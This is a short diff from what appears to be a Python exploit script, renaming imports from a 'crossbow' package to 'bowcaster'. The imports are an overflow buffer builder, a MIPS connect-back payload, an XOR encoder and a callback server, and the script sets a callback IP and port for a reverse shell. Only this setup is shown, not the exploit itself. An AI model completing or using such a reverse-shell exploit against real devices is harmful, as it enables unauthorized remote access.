@@ -16,12 +16,12 @@ import sys
 import socket
 import signal
 import time
-from crossbow.overflow_development.overflowbuilder import EmptyOverflowBuffer
-from crossbow.common.support import LittleEndian
-from crossbow.servers import ConnectbackHost
-from crossbow.servers.callback_server import ConnectbackServer
-from crossbow.payloads.mips.callback_payload import CallbackPayload
-from crossbow.encoders.mips import MipsXorEncoder
+from bowcaster.overflow_development.overflowbuilder import EmptyOverflowBuffer
+from bowcaster.common.support import LittleEndian
+from bowcaster.servers import ConnectbackHost
+from bowcaster.servers.callback_server import ConnectbackServer
+from bowcaster.payloads.mips.callback_payload import CallbackPayload
+from bowcaster.encoders.mips import MipsXorEncoder
 
 CALLBACK_IP="192.168.1.65"
 CALLBACK_PORT="8080"
